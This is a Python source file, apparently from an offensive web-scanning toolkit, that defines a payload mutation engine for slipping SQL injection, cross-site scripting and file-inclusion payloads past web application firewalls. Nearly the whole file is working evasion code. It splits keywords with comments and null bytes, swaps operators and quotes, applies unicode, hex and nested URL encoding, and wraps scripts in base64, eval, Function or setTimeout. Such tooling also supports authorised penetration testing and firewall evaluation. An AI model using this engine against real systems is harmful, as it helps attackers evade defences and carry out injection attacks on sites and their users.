"""
Payload Mutation Engine — WAF Bypass & Variation Generation
Author: ARIF
"""

import random
import re
import logging
from typing import List, Dict


class PayloadMutator:
    def __init__(self, config: Dict):
        self.logger = logging.getLogger(__name__)
        self.config = config
        self.mutation_depth = config.get("payload_generation", {}).get("mutation_depth", 3)

    def mutate(self, payload: str, module: str = "") -> List[str]:
        mutations = []
        mutation_funcs = [
            self.case_mutation,
            self.whitespace_variation,
            self.comment_injection,
            self.operator_swap,
            self.quote_alternation,
            self.parenthesis_variation,
            self.null_byte_append,
            self.double_encoding,
            self.unicode_bypass,
            self.hex_alternatives,
            self.base64_wrapping,
            self.eval_wrapping,
            self.concat_bypass,
            self.keyword_splitting,
            self.encoding_nesting,
            self.boundary_injection,
        ]
        for func in mutation_funcs[:self.mutation_depth + 5]:
            try:
                results = func(payload, module)
                if results:
                    if isinstance(results, list):
                        mutations.extend(results[:2])
                    else:
                        mutations.append(results)
            except Exception as e:
                self.logger.debug(f"Mutation error ({func.__name__}): {e}")
        return list(set(mutations))[:40]

    def case_mutation(self, payload: str, module: str = "") -> List[str]:
        if len(payload) < 3:
            return []
        variants = set()
        for _ in range(3):
            variant = ''.join(
                c.upper() if random.random() > 0.5 else c.lower()
                if c.isalpha() else c
                for c in payload
            )
            if variant != payload:
                variants.add(variant)
        alt = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        if alt != payload:
            variants.add(alt)
        return list(variants)

    def whitespace_variation(self, payload: str, module: str = "") -> List[str]:
        if ' ' not in payload:
            return []
        variants = []
        variants.append(payload.replace(' ', '\t'))
        variants.append(payload.replace(' ', '\n'))
        variants.append(payload.replace(' ', '\r'))
        variants.append(payload.replace(' ', '\f'))
        variants.append(payload.replace(' ', '\u00a0'))
        if module in ["sql", "sqli"]:
            variants.append(payload.replace(' ', '/**/'))
            variants.append(payload.replace(' ', '/*!*/'))
        variants.append(payload.replace(' ', '+'))
        variants.append(payload.replace(' ', '%20'))
        variants.append(re.sub(r'\s+', '', payload))
        return list(set(variants))

    def comment_injection(self, payload: str, module: str = "") -> List[str]:
        variants = []
        keywords = re.findall(r'\b[A-Za-z_]{3,}\b', payload)
        for kw in list(set(keywords))[:5]:
            if len(kw) >= 3:
                pos = payload.find(kw)
                if pos >= 0:
                    variants.append(payload[:pos] + kw[0] + '/**/' + kw[1:] + payload[pos+len(kw):])
                    variants.append(payload[:pos] + kw[0] + '/*!*/' + kw[1:] + payload[pos+len(kw):])
                    if len(kw) > 3:
                        variants.append(payload[:pos] + kw[:len(kw)//2] + '/**/' + kw[len(kw)//2:] + payload[pos+len(kw):])
        if module in ["sql", "sqli"]:
            if "SELECT" in payload.upper() or "UNION" in payload.upper():
                variants.append(payload.replace(" OR ", " O/**/R "))
                variants.append(payload.replace(" AND ", " A/**/ND "))
                variants.append(payload.replace("WHERE", "WH/**/ERE"))
        if module == "xss":
            if "onerror" in payload.lower():
                variants.append(payload.replace("onerror", "on/**/error"))
                variants.append(payload.replace("onerror", "on%20error"))
            if "alert" in payload.lower():
                variants.append(payload.replace("alert", "al/**/ert"))
        return list(set(variants))

    def operator_swap(self, payload: str, module: str = "") -> List[str]:
        variants = []
        if '=' in payload:
            variants.append(payload.replace('=', 'LIKE'))
            variants.append(payload.replace('=', 'IN'))
        if 'OR' in payload.upper():
            variants.append(payload.replace('OR', '||'))
            variants.append(payload.replace('OR', '|'))
        if 'AND' in payload.upper():
            variants.append(payload.replace('AND', '&&'))
            variants.append(payload.replace('AND', '&'))
        if "1=1" in payload:
            variants.append(payload.replace("1=1", "1 LIKE 1"))
            variants.append(payload.replace("1=1", "'a'='a'"))
            variants.append(payload.replace("1=1", "2>1"))
            variants.append(payload.replace("1=1", "1<2"))
            variants.append(payload.replace("1=1", "'1'='1'"))
        return variants

    def quote_alternation(self, payload: str, module: str = "") -> List[str]:
        variants = []
        if "'" in payload and '"' not in payload:
            variants.append(payload.replace("'", '"'))
        if '"' in payload and "'" not in payload:
            variants.append(payload.replace('"', "'"))
        if "'" in payload:
            variants.append(payload.replace("'", "\\'"))
            variants.append(payload.replace("'", "''"))
            variants.append(payload.replace("'", "`"))
        return list(set(variants))

    def parenthesis_variation(self, payload: str, module: str = "") -> List[str]:
        variants = []
        if '(' in payload:
            variants.append(payload.replace('(', '\\(').replace(')', '\\)'))
            variants.append(payload.replace('(', '%28').replace(')', '%29'))
        if not payload.startswith('('):
            variants.append(f'({payload})')
        return variants

    def null_byte_append(self, payload: str, module: str = "") -> List[str]:
        variants = []
        if module in ["lfi", "file"]:
            variants.append(payload + '%00')
            variants.append(payload + '\\x00')
            variants.append(payload + '\\\\x00')
            variants.append(payload.replace('.php', '.php%00'))
            variants.append(payload.replace('.php', '.php\\x00'))
            variants.append(payload.replace('.php', '.php\\\\x00'))
        return variants

    def double_encoding(self, payload: str, module: str = "") -> List[str]:
        from payloads.engine.encoder import PayloadEncoder
        encoder = PayloadEncoder(self.config)
        once = encoder.url_encode(payload)
        if once != payload:
            return [encoder.url_encode(once)]
        return []

    def unicode_bypass(self, payload: str, module: str = "") -> List[str]:
        variants = []
        replacements = {}
        if module in ["sql", "sqli"]:
            replacements = {
                'S': ['\\u0053', '%53'], 'E': ['\\u0045', '%45'],
                'L': ['\\u004c', '%4c'], 'C': ['\\u0043', '%43'],
                'T': ['\\u0054', '%54'], 'U': ['\\u0055', '%55'],
                'N': ['\\u004e', '%4e'], 'I': ['\\u0049', '%49'],
                'O': ['\\u004f', '%4f'], 'R': ['\\u0052', '%52'],
                'A': ['\\u0041', '%41'], 'D': ['\\u0044', '%44'],
                'F': ['\\u0046', '%46'], 'B': ['\\u0042', '%42'],
                'P': ['\\u0050', '%50'], 'H': ['\\u0048', '%48'],
                'W': ['\\u0057', '%57'], 'Y': ['\\u0059', '%59'],
            }
        elif module == "xss":
            replacements = {
                'a': ['\\u0061'], 'l': ['\\u006c'], 'e': ['\\u0065'],
                'r': ['\\u0072'], 't': ['\\u0074'], 's': ['\\u0073'],
                'c': ['\\u0063'], 'i': ['\\u0069'], 'p': ['\\u0070'],
                'o': ['\\u006f'], 'n': ['\\u006e'], 'd': ['\\u0064'],
            }
        for kw, reps in replacements.items():
            if kw in payload:
                for rep in reps[:2]:
                    variants.append(payload.replace(kw, rep))
        return variants

    def hex_alternatives(self, payload: str, module: str = "") -> List[str]:
        variants = []
        if module == "xss":
            if "alert" in payload.lower():
                start = payload.lower().find("alert")
                word = payload[start:start+5]
                hex_word = ''.join(f'\\x{ord(c):02x}' for c in word)
                variants.append(payload[:start] + hex_word + payload[start+5:])
        return variants

    def base64_wrapping(self, payload: str, module: str = "") -> List[str]:
        import base64
        variants = []
        if module == "xss":
            b64 = base64.b64encode(payload.encode()).decode()
            variants.append(f"eval(atob('{b64}'))")
            variants.append(f"eval(Base64.decode('{b64}'))")
            variants.append(f"Function(atob('{b64}'))()")
        return variants

    def eval_wrapping(self, payload: str, module: str = "") -> List[str]:
        variants = []
        if module == "xss":
            extracted = re.sub(r'<[^>]+>', '', payload)[:30]
            if extracted:
                variants.append(f"eval('{extracted}')")
                variants.append(f"Function('{extracted}')()")
                variants.append(f"setTimeout('{extracted}',0)")
                variants.append(f"setInterval('{extracted}',1000)")
        return variants

    def concat_bypass(self, payload: str, module: str = "") -> List[str]:
        variants = []
        if module in ["sql", "sqli"]:
            for i, c in enumerate(payload):
                if c.isalpha():
                    left = payload[:i]
                    right = payload[i:]
                    if len(left) > 0 and len(right) > 0:
                        variants.append(left + "||" + right)
                        break
            keywords = re.findall(r'\b[A-Za-z]{4,}\b', payload)
            for kw in list(set(keywords))[:3]:
                if len(kw) >= 4:
                    midpoint = len(kw) // 2
                    variants.append(payload.replace(kw, kw[:midpoint] + '||' + kw[midpoint:], 1))
        return variants

    def keyword_splitting(self, payload: str, module: str = "") -> List[str]:
        variants = []
        if module in ["sql", "sqli"]:
            split_map = {
                'SELECT': 'SEL\u0000ECT', 'UNION': 'UN\u0000ION',
                'WHERE': 'WH\u0000ERE', 'FROM': 'FR\u0000OM',
                'DROP': 'DR\u0000OP', 'INSERT': 'INS\u0000ERT',
                'UPDATE': 'UP\u0000DATE', 'DELETE': 'DEL\u0000ETE',
                'ALTER': 'ALT\u0000ER', 'CREATE': 'CRE\u0000ATE',
                'TABLE': 'TAB\u0000LE', 'SLEEP': 'SLE\u0000EP',
                'BENCHMARK': 'BENCH\u0000MARK'
            }
            for kw, split in split_map.items():
                if kw in payload.upper():
                    pos = payload.upper().find(kw)
                    original = payload[pos:pos+len(kw)]
                    variants.append(payload.replace(original, split, 1))
        if module == "xss":
            split_map = {
                'script': 'scr\u0000ipt', 'alert': 'al\u0000ert',
                'onerror': 'one\u0000rror', 'onload': 'onl\u0000oad',
                'javascript': 'java\u0000script'
            }
            for kw, split in split_map.items():
                if kw in payload.lower():
                    pos = payload.lower().find(kw)
                    original = payload[pos:pos+len(kw)]
                    variants.append(payload.replace(original, split, 1))
        return variants

    def encoding_nesting(self, payload: str, module: str = "") -> List[str]:
        variants = []
        from payloads.engine.encoder import PayloadEncoder
        encoder = PayloadEncoder(self.config)
        for _ in range(3):
            current = payload
            for __ in range(3):
                current = encoder.url_encode(current)
            if current != payload:
                variants.append(current)
        return variants[:2]

    def boundary_injection(self, payload: str, module: str = "") -> List[str]:
        variants = []
        variants.append(f"\r\n{payload}\r\n")
        variants.append(f"\n{payload}\n")
        variants.append(f"\r{payload}\r")
        variants.append(f"\t{payload}\t")
        variants.append(f"\u0000{payload}\u0000")
        variants.append(f"%00{payload}%00")
        return variants
